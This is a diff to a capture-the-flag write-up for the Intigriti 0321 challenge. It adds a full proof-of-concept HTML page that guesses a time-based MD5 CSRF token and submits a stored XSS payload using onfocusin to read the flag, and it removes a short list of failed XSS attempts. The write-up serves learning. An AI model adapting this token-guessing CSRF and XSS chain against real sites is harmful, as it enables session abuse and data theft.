@@ -168,15 +168,63 @@ To bypass CSRF protection, we have to analyze the working or csrf token
 and got this result
 ![image](https://user-images.githubusercontent.com/19681324/113504596-b917c180-9556-11eb-8d2d-070f1aaa3c33.png)
 5. this succecceded in guessing the time and as a result csrf token quite a number of time, but missed as well ( sometimes)
+6. Still one more thing require, we need to first let the application load to set the phpsessionid. Without session id our payload will not be saved. 
+
+Final POC
+------------
+1. So we load the application first, and wait for the page load to finish so that phpsessionid is available for further request to the server
+2. Simultaneously we will md5 hash the current time minues 2 second assuming 2 second cycle time between response and response, to get the csrf token
+3. we will open a new window in a different tab, with the token and submit the form ( having our payoad ) when page load in the previous tab is finished
+4. Final POC is below, try to run this multiple times to get the popup. Do change the time delay based on your network speed for the alert to fireup :)
+
+```html
+<!DOCTYPE html>
+<html>
+  <head>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/blueimp-md5/2.16.0/js/md5.min.js"></script>
+  </head>
+  <body>
+   <button onclick="exploit()"> Click Me </button>
+    <form action="https://challenge-0321.intigriti.io/#x" method="post">
+      <input type="hidden" id="csrf" name="csrf" value="" />
+      <input
+        type="hidden"
+        name="notes"
+        value="" id="payload"
+      />
+    </form>
+    <script>
+      function exploit() {
+        
+		var currentSecond = Math.floor(Date.now() / 1000); 
+        var myDate = new Date((currentSecond*1000)-1000); 
+        var d = Math.floor(Date.now() / 1000 )-1;
+		var token = md5(d);
+        console.log(myDate.toGMTString());
+        console.log(token);
+		
+		window.open("#" + token, "_blank");
+        window.open("https://challenge-0321.intigriti.io/", "_self");
+      }
+      var hash = location.hash.substring(1);
+      if (hash) {
+        setTimeout(function () {
+          document.getElementById("csrf").value = hash;
+		  document.getElementById("payload").value = '"id=\'x\'tabindex=\'1\'onfocusin=\'alert(flag.innerHTML)\'"@x.y'
+          document.forms[0].submit();
+        }, 3000);
+      }
+    </script>
+   </body>
+</html>
+```
+
+![image](https://user-images.githubusercontent.com/19681324/113505269-4c52f600-955b-11eb-8a27-6edb2130d6e6.png)
+
+#Note - I could not solve this. I have written this based on the writeups mentioned in the credit and reference section below. I wrote this to learn and cement the concepts used in the challenge. Hopefully someone else benifits from this.
 
 
 
-
-Things i tried but didn't work
-------------------------------
-
-tried `javascript://%0Aalert(1)`
-tried `"<svg/onload=alert(1)>"@x.y`
 
 
 Credit and reference
